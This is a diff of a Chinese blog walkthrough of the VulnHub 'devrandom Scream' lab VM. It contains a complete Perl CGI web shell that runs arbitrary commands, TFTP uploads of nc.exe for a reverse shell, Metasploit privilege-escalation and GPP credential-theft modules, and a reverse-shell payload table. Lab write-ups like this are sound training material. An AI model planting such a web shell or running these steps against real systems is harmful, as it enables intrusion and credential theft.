@@ -28,8 +28,8 @@
 <meta property="og:description" content="前提kali IP 192.168.129.152 windows xp 设置成NAT模式 信息收集扫描ipnmap -sP 192.168.129.0&#x2F;24   目标应该就是 192.168.129.163了 扫描端口 masscan 192.168.129.163 -p1-65535 –rate 100000 扫出来 21，22，23，80端口 nmap -sT -sV -Pn -v">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cbbzx12.github.io/images/head.jpg">
-<meta property="article:published_time" content="2025-12-24T11:54:38.360Z">
-<meta property="article:modified_time" content="2025-12-24T11:54:38.360Z">
+<meta property="article:published_time" content="2025-12-24T12:00:03.474Z">
+<meta property="article:modified_time" content="2025-12-24T12:00:03.474Z">
 <meta property="article:author" content="bug_001">
 <meta property="article:tag" content="WP">
 <meta name="twitter:card" content="summary">
@@ -140,7 +140,7 @@
   <span class="sep"></span>
   <a class="cap breadcrumb" href="/wiki/WP/vulnhub/devrandom%20Scream/">devrandom Scream</a>
   </div>
-<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-12-24T11:54:38.360Z">2025-12-24</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-12-24T12:00:03.474Z">2025-12-24</time></span></div></div></div>
     
     <div class="bottom only-title">
       
@@ -164,7 +164,7 @@
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763013924799-3e3be79f-fba3-415b-af92-e577d70876ad.png"></p>
 <h3 id="尝试匿名登录"><a href="#尝试匿名登录" class="headerlink" title="尝试匿名登录"></a>尝试匿名登录</h3><p>应该是下面提权那块，改服务导致连不上ftp</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763014163755-a439de35-b667-4dc0-bfb9-ac1721e7e162.png"></p>
-<p><font style="color:rgb(56, 56, 56);">表明可能正在运行 TFTP 服务</font></p>
+<p>表明可能正在运行 TFTP 服务</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763014245690-0602b5ab-ade2-41f0-ab72-44b80a293c89.png"></p>
 <h3 id="扫描udp"><a href="#扫描udp" class="headerlink" title="扫描udp"></a>扫描udp</h3><p>nmap -sU -p- 192.168.129.163 </p>
 <h3 id="tftp-192-163-129-163"><a href="#tftp-192-163-129-163" class="headerlink" title="tftp 192.163.129.163"></a>tftp 192.163.129.163</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763014764135-46f52cab-f822-4100-b91b-b0b2342f029a.png"></p>
@@ -173,18 +173,18 @@
 <p>但确实能访问成功</p>
 <p>然后通过ftp匿名登录，可以看到有一个cgi-bin,可以尝试上传这类木马</p>
 <h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763014044654-deb23b04-8d4a-4a44-9693-510657870d61.png"></p>
-<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h2 id="cgi-bin解释"><a href="#cgi-bin解释" class="headerlink" title="cgi-bin解释"></a>cgi-bin解释</h2><p><font style="color:rgb(51, 61, 66);background-color:rgb(249, 250, 251);">CGI 代表</font><font style="color:rgb(51, 61, 66);background-color:rgb(249, 250, 251);"> </font><strong><font style="color:rgb(51, 61, 66);background-color:rgb(249, 250, 251);">通用网关接口</font></strong><font style="color:rgb(51, 61, 66);background-color:rgb(249, 250, 251);">。”Bin” 是</font><font style="color:rgb(51, 61, 66);background-color:rgb(249, 250, 251);"> </font><strong><font style="color:rgb(51, 61, 66);background-color:rgb(249, 250, 251);">binary（二进制）</font></strong><font style="color:rgb(51, 61, 66);background-color:rgb(249, 250, 251);"> </font><font style="color:rgb(51, 61, 66);background-color:rgb(249, 250, 251);">的缩写 - 经常用来指代可执行文件或脚本。</font></p>
-<p><strong><font style="color:rgb(51, 61, 66);background-color:rgb(249, 250, 251);">&#x2F;cgi-bin&#x2F;</font></strong><font style="color:rgb(51, 61, 66);background-color:rgb(249, 250, 251);"> 目录是网站开发者放置可执行文件的地方，这样他们的网站就能拥有比纯 HTML 更多的功能。</font></p>
+<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h2 id="cgi-bin解释"><a href="#cgi-bin解释" class="headerlink" title="cgi-bin解释"></a>cgi-bin解释</h2><p>CGI 代表 <strong>通用网关接口</strong>。”Bin” 是 <strong>binary（二进制）</strong> 的缩写 - 经常用来指代可执行文件或脚本。</p>
+<p><strong>&#x2F;cgi-bin&#x2F;</strong> 目录是网站开发者放置可执行文件的地方，这样他们的网站就能拥有比纯 HTML 更多的功能。</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763016089186-2df29948-cc1e-49a9-a561-10da94c13f21.png"></p>
-<p><em><font style="color:rgb(217, 48, 37);">主流的CGI程序用Perl编写</font></em></p>
+<p><em>主流的CGI程序用Perl编写</em></p>
 <h2 id="上传perl-木马-虽然界面乱码，但不影响使用"><a href="#上传perl-木马-虽然界面乱码，但不影响使用" class="headerlink" title="上传perl 木马,虽然界面乱码，但不影响使用"></a>上传perl 木马,虽然界面乱码，但不影响使用</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> warnings;</span><br><span class="line"><span class="keyword">use</span> CGI;</span><br><span class="line"><span class="keyword">use</span> Cwd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> CGI::header(<span class="string">-type =&gt;</span> <span class="string">&#x27;text/html&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> <span class="variable">$query</span>     = new CGI;</span><br><span class="line"><span class="keyword">my</span> <span class="variable">$command</span>   = <span class="variable">$query</span>-&gt;param(<span class="string">&#x27;command&#x27;</span>) || <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">my</span> <span class="variable">$pwd</span>       = <span class="variable">$query</span>-&gt;param(<span class="string">&#x27;pwd&#x27;</span>)     || <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">my</span> <span class="variable">$password</span>  = <span class="variable">$query</span>-&gt;param(<span class="string">&#x27;password&#x27;</span>)|| <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">my</span> <span class="variable">$filename</span>  = <span class="variable">$query</span>-&gt;script_name();</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密码验证</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$password</span> <span class="keyword">ne</span> <span class="string">&#x27;yourpassword&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;请提供有效的密码\n&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理当前目录</span></span><br><span class="line"><span class="variable">$pwd</span> = <span class="string">`pwd`</span> <span class="keyword">unless</span> <span class="variable">$pwd</span>;</span><br><span class="line"><span class="keyword">chomp</span>(<span class="variable">$pwd</span>);                <span class="comment"># 移除末尾换行符</span></span><br><span class="line"><span class="keyword">eval</span> &#123; <span class="keyword">chdir</span>(<span class="variable">$pwd</span>) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行命令</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$command</span> =~ <span class="regexp">/^cd\s+(.+)$/</span>) &#123;</span><br><span class="line">    <span class="keyword">my</span> <span class="variable">$new_dir</span> = <span class="variable">$1</span>;</span><br><span class="line">    <span class="keyword">eval</span> &#123; <span class="keyword">chdir</span>(<span class="variable">$new_dir</span>) &#125;;</span><br><span class="line">    <span class="variable">$pwd</span> = Cwd::cwd();</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">`ls -la 2&gt;&amp;1`</span>;</span><br><span class="line">&#125; <span class="keyword">elsif</span> (<span class="variable">$command</span> =~ <span class="regexp">/^cd\s*$/</span>) &#123;</span><br><span class="line">    <span class="keyword">chdir</span>(<span class="variable">$ENV</span><span class="string">&#123;HOME&#125;</span>);</span><br><span class="line">    <span class="variable">$pwd</span> = Cwd::cwd();</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">`ls -la 2&gt;&amp;1`</span>;</span><br><span class="line">&#125; <span class="keyword">elsif</span> (<span class="variable">$command</span>) &#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">`$command 2&gt;&amp;1`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># HTML输出</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">qq&#123;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;网页控制台&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">window.onload = function() &#123;</span></span><br><span class="line"><span class="string">    document.getElementById(&quot;command&quot;).focus();</span></span><br><span class="line"><span class="string">&#125;</span>;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;style type=&quot;text/</span>css<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">.wide1 &#123;</span></span><br><span class="line"><span class="string">    border: 2px solid #ccc;</span></span><br><span class="line"><span class="string">    width: 98<span class="variable">%;</span></span></span><br><span class="line"><span class="string">    height: 400px;</span></span><br><span class="line"><span class="string">    font-family: monospace;</span></span><br><span class="line"><span class="string">    padding: 10px;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">.wide2 &#123;</span></span><br><span class="line"><span class="string">    border: 2px solid #ccc;</span></span><br><span class="line"><span class="string">    width: 70<span class="variable">%;</span></span></span><br><span class="line"><span class="string">    padding: 5px;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">.container &#123;</span></span><br><span class="line"><span class="string">    margin: 20px;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">.info &#123;</span></span><br><span class="line"><span class="string">    background-color: #f0f0f0;</span></span><br><span class="line"><span class="string">    padding: 10px;</span></span><br><span class="line"><span class="string">    margin-bottom: 10px;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&quot;</span>container<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;</span>info<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">        脚本: <span class="variable">$filename</span> | 当前目录: <span class="variable">$pwd</span></span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;pre class=&quot;</span>wide1<span class="string">&quot;&gt;<span class="variable">$result</span>&lt;/pre&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;form method=&quot;</span>post<span class="string">&quot; action=&quot;</span><span class="variable">$filename</span><span class="string">&quot; name=&quot;</span>cmdForm<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;label for=&quot;</span>command<span class="string">&quot;&gt;命令:&lt;/label&gt;</span></span><br><span class="line"><span class="string">        &lt;input class=&quot;</span>wide2<span class="string">&quot; name=&quot;</span>command<span class="string">&quot; id=&quot;</span>command<span class="string">&quot; autocomplete=&quot;</span>off<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;</span>submit<span class="string">&quot; value=&quot;</span>执行<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;input name=&quot;</span>password<span class="string">&quot; value=&quot;</span><span class="variable">$password</span><span class="string">&quot; type=&quot;</span>hidden<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;input name=&quot;</span>pwd<span class="string">&quot; value=&quot;</span><span class="variable">$pwd</span><span class="string">&quot; type=&quot;</span>hidden<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">exit 0;</span></span><br></pre></td></tr></table></figure>
 
-<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h3 id="1-PowerCat-ps1-失败"><a href="#1-PowerCat-ps1-失败" class="headerlink" title="1.PowerCat.ps1(失败)"></a>1.PowerCat.ps1(失败)</h3><p><font style="color:rgba(0, 0, 0, 0.9);">靶机是 </font><strong><font style="color:rgba(0, 0, 0, 0.9);">Windows XP 精简版</font></strong><font style="color:rgba(0, 0, 0, 0.9);"> 或者 </font><strong><font style="color:rgba(0, 0, 0, 0.9);">老 IIS 环境</font></strong><font style="color:rgba(0, 0, 0, 0.9);">，系统目录里 </font><strong><font style="color:rgba(0, 0, 0, 0.9);">没有 powershell.exe</font></strong></p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h3 id="1-PowerCat-ps1-失败"><a href="#1-PowerCat-ps1-失败" class="headerlink" title="1.PowerCat.ps1(失败)"></a>1.PowerCat.ps1(失败)</h3><p>靶机是 <strong>Windows XP 精简版</strong> 或者 <strong>老 IIS 环境</strong>，系统目录里 <strong>没有 powershell.exe</strong></p>
 <h3 id="2-nc-exe"><a href="#2-nc-exe" class="headerlink" title="2.nc.exe"></a>2.nc.exe</h3><h4 id="tftp-上传32位nc-exe"><a href="#tftp-上传32位nc-exe" class="headerlink" title="tftp 上传32位nc.exe"></a>tftp 上传32位nc.exe</h4><p> wget <a target="_blank" rel="noopener" href="https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip">https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip</a></p>
 <p>unzip netcat-win32-1.11.zip </p>
 <p>cd netcat-1.11</p>
 <p>tftp 192.168.129.163</p>
-<p>binary   <strong><font style="color:#DF2A3F;">必须将传输模式切换为</font></strong><code>&lt;font style=&quot;color:#DF2A3F;background-color:rgb(249, 242, 244);&quot;&gt;binary&lt;/font&gt;</code><strong><font style="color:#DF2A3F;">，否则</font></strong><font style="color:#DF2A3F;">TFTP会上传纯文本</font></p>
+<p>binary   <strong>必须将传输模式切换为</strong><code>binary</code><strong>，否则</strong>TFTP会上传纯文本</p>
 <p>put nc.exe &#x2F;cgi-bin&#x2F;nc.exe</p>
 <h4 id="网页端查看是否上传成功"><a href="#网页端查看是否上传成功" class="headerlink" title="网页端查看是否上传成功"></a>网页端查看是否上传成功</h4><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762942820523-a7f1386c-c2c9-4340-a7f3-a4ef210b396e.png"></p>
 <p>成功上传</p>
@@ -200,9 +200,9 @@
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762947087985-403c9663-99f4-4b14-85b8-28ad5f112df9.png"></p>
 <h4 id="网页端运行"><a href="#网页端运行" class="headerlink" title="网页端运行"></a>网页端运行</h4><p>start  .\shell.exe</p>
 <h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><h3 id="msf自动查找"><a href="#msf自动查找" class="headerlink" title="msf自动查找"></a>msf自动查找</h3><h4 id="利用之前反弹的shell"><a href="#利用之前反弹的shell" class="headerlink" title="利用之前反弹的shell"></a>利用之前反弹的shell</h4><p>bg(把会话放进后端)</p>
-<p>use <font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester(全自动)</font></p>
-<p><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">set session 2 (因为反弹的shell提示会话是2)</font></p>
-<p><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">run</font></p>
+<p>use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester(全自动)</p>
+<p>set session 2 (因为反弹的shell提示会话是2)</p>
+<p>run</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762947704572-c2b58b75-78a9-42b4-810e-7874ad5e7551.png"></p>
 <h4 id="查找可利用的点，绿色的都可以试试"><a href="#查找可利用的点，绿色的都可以试试" class="headerlink" title="查找可利用的点，绿色的都可以试试"></a>查找可利用的点，绿色的都可以试试</h4><p>use exploit&#x2F;windows&#x2F;local&#x2F;ms10_015_kitrap0d</p>
 <p>set session 2</p>
@@ -215,17 +215,17 @@
 <p>下面好几个都可以用，有一个就可以</p>
 <h3 id="手工-所有自动方法不行的话，最后再手工，提高效率"><a href="#手工-所有自动方法不行的话，最后再手工，提高效率" class="headerlink" title="手工(所有自动方法不行的话，最后再手工，提高效率)"></a>手工(所有自动方法不行的话，最后再手工，提高效率)</h3><h2 id="错误的系统配置"><a href="#错误的系统配置" class="headerlink" title="错误的系统配置"></a>错误的系统配置</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h4 id="传送-winpeas-，accesschk"><a href="#传送-winpeas-，accesschk" class="headerlink" title="传送 winpeas ，accesschk"></a>传送 winpeas ，accesschk</h4><p>tftp&gt; put winPEASx86.exe &#x2F;cgi-bin&#x2F;winPEASx86.exe</p>
 <h4 id="先nc反弹shell"><a href="#先nc反弹shell" class="headerlink" title="先nc反弹shell"></a>先nc反弹shell</h4><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762950723219-e815ba5f-61a5-4301-8daa-fc547223d0af.png"></p>
-<h4 id="winPEAS检查服务配置错误"><a href="#winPEAS检查服务配置错误" class="headerlink" title="winPEAS检查服务配置错误"></a>winPEAS检查服务配置错误</h4><p><font style="color:rgb(36, 41, 47);">.\winPEASx86.exe quiet servicesinfo</font></p>
+<h4 id="winPEAS检查服务配置错误"><a href="#winPEAS检查服务配置错误" class="headerlink" title="winPEAS检查服务配置错误"></a>winPEAS检查服务配置错误</h4><p>.\winPEASx86.exe quiet servicesinfo</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762951550735-0d0f4a01-34b0-4803-93d7-53a32f7b062f.png"></p>
 <p>卡住了，应该是系统太老了，跳过</p>
-<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><h4 id="前提-先有一个反弹shell"><a href="#前提-先有一个反弹shell" class="headerlink" title="前提:先有一个反弹shell"></a>前提:先有一个反弹shell</h4><h4 id="use-exploit-windows-local-service-permissions"><a href="#use-exploit-windows-local-service-permissions" class="headerlink" title="use exploit&#x2F;windows&#x2F;local&#x2F;service_permissions"></a><font style="color:rgb(36, 41, 47);">use exploit&#x2F;windows&#x2F;local&#x2F;service_permissions</font></h4><p><font style="color:rgb(36, 41, 47);">set session 1</font></p>
-<p><font style="color:rgb(36, 41, 47);">另外一个msf窗口监听</font></p>
+<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><h4 id="前提-先有一个反弹shell"><a href="#前提-先有一个反弹shell" class="headerlink" title="前提:先有一个反弹shell"></a>前提:先有一个反弹shell</h4><h4 id="use-exploit-windows-local-service-permissions"><a href="#use-exploit-windows-local-service-permissions" class="headerlink" title="use exploit&#x2F;windows&#x2F;local&#x2F;service_permissions"></a>use exploit&#x2F;windows&#x2F;local&#x2F;service_permissions</h4><p>set session 1</p>
+<p>另外一个msf窗口监听</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762952256586-08526976-4e90-42a9-8d49-c042628a33b4.png"></p>
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762952349702-68d23131-cd8a-40f2-83f1-91fe7f32f23d.png"></p>
 <p>失败，换一个</p>
 <h4 id="use-exploit-windows-local-unquoted-service-path"><a href="#use-exploit-windows-local-unquoted-service-path" class="headerlink" title="use exploit&#x2F;windows&#x2F;local&#x2F;unquoted_service_path"></a>use exploit&#x2F;windows&#x2F;local&#x2F;unquoted_service_path</h4><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762952435070-48e19739-bc02-49cc-9f43-f5873657f151.png"></p>
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762952522776-972c0273-7e23-4147-97db-5afcfb4a5058.png"></p>
-<p><font style="color:rgb(36, 41, 47);">失败</font></p>
+<p>失败</p>
 <h3 id="手工"><a href="#手工" class="headerlink" title="手工"></a>手工</h3><h4 id="查看系统进程"><a href="#查看系统进程" class="headerlink" title="查看系统进程"></a>查看系统进程</h4><p>tasklist &#x2F;FI “username eq SYSTEM”</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763007471233-8a52ccac-f196-47e6-83e3-23be9058e00a.png"></p>
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763007531631-5740af57-cc89-4b47-91a2-2bcf826320cf.png"><br>这几个都是系统进程，尝试能不能停止进程</p>
@@ -245,52 +245,52 @@
 <h4 id="注意-msf-生成的木马，得分情况能不能用nc反弹shell"><a href="#注意-msf-生成的木马，得分情况能不能用nc反弹shell" class="headerlink" title="注意 msf 生成的木马，得分情况能不能用nc反弹shell"></a>注意 msf 生成的木马，得分情况能不能用nc反弹shell</h4><table>
 <thead>
 <tr>
-<th><strong><font style="color:rgba(0, 0, 0, 0.88);">Payload 类型</font></strong></th>
-<th><strong><font style="color:rgba(0, 0, 0, 0.88);">能否用 NC 接收</font></strong></th>
-<th><strong><font style="color:rgba(0, 0, 0, 0.88);">备注</font></strong></th>
+<th><strong>Payload 类型</strong></th>
+<th><strong>能否用 NC 接收</strong></th>
+<th><strong>备注</strong></th>
 </tr>
 </thead>
 <tbody><tr>
-<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;linux/x86/shell_reverse_tcp&lt;/font&gt;</code></td>
-<td><font style="color:rgba(0, 0, 0, 0.88);">✅</font><font style="color:rgba(0, 0, 0, 0.88);"> Yes</font></td>
-<td><font style="color:rgba(0, 0, 0, 0.88);">标准 reverse shell</font></td>
+<td><code>linux/x86/shell_reverse_tcp</code></td>
+<td>✅ Yes</td>
+<td>标准 reverse shell</td>
 </tr>
 <tr>
-<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;windows/shell_reverse_tcp&lt;/font&gt;</code></td>
-<td><font style="color:rgba(0, 0, 0, 0.88);">✅</font><font style="color:rgba(0, 0, 0, 0.88);"> Yes</font></td>
-<td><font style="color:rgba(0, 0, 0, 0.88);">Windows cmd shell</font></td>
+<td><code>windows/shell_reverse_tcp</code></td>
+<td>✅ Yes</td>
+<td>Windows cmd shell</td>
 </tr>
 <tr>
-<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;java/shell_reverse_tcp&lt;/font&gt;</code></td>
-<td><font style="color:rgba(0, 0, 0, 0.88);">✅</font><font style="color:rgba(0, 0, 0, 0.88);"> Yes</font></td>
-<td><font style="color:rgba(0, 0, 0, 0.88);">Java reverse shell</font></td>
+<td><code>java/shell_reverse_tcp</code></td>
+<td>✅ Yes</td>
+<td>Java reverse shell</td>
 </tr>
 <tr>
-<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;php/reverse_php&lt;/font&gt;</code></td>
-<td><font style="color:rgba(0, 0, 0, 0.88);">✅</font><font style="color:rgba(0, 0, 0, 0.88);"> Yes</font></td>
-<td><font style="color:rgba(0, 0, 0, 0.88);">PHP reverse shell</font></td>
+<td><code>php/reverse_php</code></td>
+<td>✅ Yes</td>
+<td>PHP reverse shell</td>
 </tr>
 <tr>
-<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;meterpreter/reverse_tcp&lt;/font&gt;</code></td>
-<td><font style="color:rgba(0, 0, 0, 0.88);">❌</font><font style="color:rgba(0, 0, 0, 0.88);"> No</font></td>
-<td><font style="color:rgba(0, 0, 0, 0.88);">需要 MSF handler</font></td>
+<td><code>meterpreter/reverse_tcp</code></td>
+<td>❌ No</td>
+<td>需要 MSF handler</td>
 </tr>
 <tr>
-<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;staged/*&lt;/font&gt;</code></td>
-<td><font style="color:rgba(0, 0, 0, 0.88);">❌</font><font style="color:rgba(0, 0, 0, 0.88);"> No</font></td>
-<td><font style="color:rgba(0, 0, 0, 0.88);">需要 stager</font></td>
+<td><code>staged/*</code></td>
+<td>❌ No</td>
+<td>需要 stager</td>
 </tr>
 <tr>
-<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;bind_tcp&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.88);"> </font><font style="color:rgba(0, 0, 0, 0.88);">variants</font></td>
-<td><font style="color:rgba(0, 0, 0, 0.88);">✅</font><font style="color:rgba(0, 0, 0, 0.88);"> Yes</font></td>
-<td><font style="color:rgba(0, 0, 0, 0.88);">需主动连接目标</font></td>
+<td><code>bind_tcp</code><br/> variants</td>
+<td>✅ Yes</td>
+<td>需主动连接目标</td>
 </tr>
 </tbody></table>
 <h4 id="启动服务前，msf先监听窗口"><a href="#启动服务前，msf先监听窗口" class="headerlink" title="启动服务前，msf先监听窗口"></a>启动服务前，msf先监听窗口</h4><p>启动服务</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763010423057-3c0aed45-04f2-4983-a970-416b629c4bb8.png"></p>
 <p>还是进程迁移一下，不然会断</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763010886779-5edc55e2-60ec-456c-954d-a9ec1ad0ff0c.png"></p>
-<h2 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h2><h3 id="post-windows-gather-credentials-gpp"><a href="#post-windows-gather-credentials-gpp" class="headerlink" title="post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp"></a><font style="color:rgb(68, 68, 68);background-color:rgb(245, 245, 250);">post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp</font></h3><p>set session 1</p>
+<h2 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h2><h3 id="post-windows-gather-credentials-gpp"><a href="#post-windows-gather-credentials-gpp" class="headerlink" title="post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp"></a>post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp</h3><p>set session 1</p>
